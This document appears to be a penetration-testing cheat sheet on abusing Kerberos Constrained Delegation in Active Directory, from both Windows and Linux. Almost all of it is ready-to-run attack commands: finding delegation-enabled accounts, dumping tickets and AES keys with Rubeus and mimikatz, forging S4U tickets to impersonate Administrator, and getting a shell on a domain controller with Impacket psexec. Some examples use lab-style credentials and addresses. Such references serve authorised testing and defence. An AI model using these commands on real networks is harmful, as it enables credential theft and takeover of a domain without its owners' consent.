# Kerberos Delegation - Constrained Delegation

> Kerberos Constrained Delegation (KCD) is a security feature in Microsoft's Active Directory (AD) that allows a service to impersonate a user or another service in order to access resources on behalf of that user or service.

## From Windows

### Identify a Constrained Delegation

* **Bloodhound**  
  BloodHound: `MATCH p = (a)-[:AllowedToDelegate]->(c:Computer) RETURN p`

* **PowerView**  
  ```powershell
  Get-NetComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto | ft
  ```

* **Native Powershell**  
  ```powershell
  Get-DomainComputer -TrustedToAuth | select -exp dnshostname
  Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
  ```

### Exploit the Constrained Delegation

* **Rubeus**  
  ```powershell
  # With a password
  Rubeus.exe s4u /nowrap /msdsspn:<time/target.local> /altservice:cifs /impersonateuser:"administrator" /domain:<domain> /user:<user> /password:<password>

  # with a NT Hash
  Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:time/srv01.domain.c    om /altservice:cifs /ptt
  #Example
  Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
  ```
* **Rubeus: use an existing ticket to perform a S4U2 attack to impersonate the "Administrator"**  
  ```powershell
  # Dump ticket
  Rubeus.exe tgtdeleg /nowrap
  Rubeus.exe triage
  Rubeus.exe dump /luid:0x12d1f7

  # Create a ticket
  Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt
  ```
* **Rubeus : Using AES256 keys**  
  ```powershell
  # Get aes256 keys of the machine account using mimikatz
  privilege::debug
  token::elevate
  sekurlsa::ekeys

  # Create a ticket
  Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /user:win10x64$ /aes256:4b55f...fd82 /ptt
  ```

### Impersonate a domain user on a resource
> Requires SYSTEM level privileges on a machine configured with constrained delegations

* **Powershell**  
  ```powershell
  [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
  $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
  $idToImpersonate.Impersonate()
  [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
  ls \\dc01.offense.local\c$
  ```
## From Linux

### Identify a Constrained Delegation

* **Impacket find Delegation**  
  ```bash
  Impacket-findDelegation <domain>/<username>:<password> -dc-ip<DC IP>
  ```
* **bloodyAD:**  
  ```bash
  bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))' --attr sAMAccountName,msds-allowedtodelegateto
  ```

### Exploit the Constrained Delegation

* **Impacket**  
  ```bash
  Impacket-getST -spn <SPN> 'DOMAIN/user:password' -impersonate Administrator -dc-ip <DC IP>

  #Example
  impacket-getST -spn TERMSRV/DC01 'inlanefreight.local/beth.richards:B3thR!ch@rd$' -impersonate Administrator -dc-ip 10.129.205.35
  ```
### Using the new ticket with PSExec
  ```bash
  export KRB5CCNAME=<CCACHE>
  Impacket-psexec -k -no-pass <domain>/<user>@host -debug

  # Example
  impacket-psexec -k -no-pass inlanefreight.local/administrator@dc01
  ```
